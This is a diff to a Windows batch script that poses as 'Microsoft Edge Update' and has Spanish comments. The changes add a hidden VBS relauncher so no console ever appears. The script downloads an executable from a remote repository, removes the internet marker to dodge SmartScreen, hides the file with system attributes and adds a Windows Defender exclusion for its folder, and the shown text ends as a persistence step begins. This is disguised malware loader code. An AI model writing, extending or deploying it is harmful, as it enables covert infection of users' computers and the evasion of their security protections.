@@ -3,21 +3,17 @@ setlocal EnableExtensions
 title Microsoft Edge Update
 
 :: ============================================================
-::  MODO SILENCIOSO
-::  Si no viene el argumento "silent", este script se relanza
-::  a si mismo OCULTO (y elevado si hace falta) y termina.
+::  LANZADOR INVISIBLE
+::  Crea un .vbs temporal que relanza este .bat con la ventana
+::  oculta. Ninguna consola visible en ningun momento.
 :: ============================================================
 if /i "%~1"=="silent" goto :run
 
-for %%I in ("%~f0") do set "SELF=%%~sI"
-if not defined SELF set "SELF=%~f0"
-
-fltmc >nul 2>&1
-if errorlevel 1 (
-    powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%SELF%' -ArgumentList 'silent' -Verb RunAs -WindowStyle Hidden"
-) else (
-    powershell -NoProfile -WindowStyle Hidden -Command "Start-Process -FilePath '%SELF%' -ArgumentList 'silent' -WindowStyle Hidden"
-)
+set "TV=%TEMP%\_mupd_%RANDOM%.vbs"
+> "%TV%" echo Set a = CreateObject("Shell.Application")
+>>"%TV%" echo a.ShellExecute "cmd.exe", "/c ""%~f0"" silent", "", "", 0
+wscript //B //Nologo "%TV%"
+del "%TV%" >nul 2>&1
 exit /b
 
 :run
@@ -63,10 +59,14 @@ if not exist "%DIR%\%EXE%" (
     powershell -NoProfile -WindowStyle Hidden -Command "for($i=0;$i -lt 3;$i++){ try{ iwr '%REPO%/%EXE%' -OutFile '%DIR%\%EXE%' -UseBasicParsing; if(Test-Path '%DIR%\%EXE%'){break} }catch{}; Start-Sleep 2 }" >nul 2>&1
 )
 
+:: --- 5b) quitar el marcador de Internet (evita el dialogo de SmartScreen) ---
+powershell -NoProfile -WindowStyle Hidden -Command "Unblock-File -Path '%DIR%\%EXE%' -ErrorAction SilentlyContinue" >nul 2>&1
+
 attrib +h +s "%DIR%\%EXE%" >nul 2>&1
 attrib +h "%DIR%" >nul 2>&1
 
-powershell -NoProfile -WindowStyle Hidden -Command "Unblock-File -Path '%DIR%\%EXE%' -ErrorAction SilentlyContinue" >nul 2>&1
+:: --- 5c) exclusion de Defender (solo aplica si hay admin) ---
+powershell -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%DIR%' -ErrorAction SilentlyContinue" >nul 2>&1
 
 :: --- 6) lanzador y persistencia nueva ---
 > "%DIR%\%VBS%" echo Set sh = CreateObject("WScript.Shell")
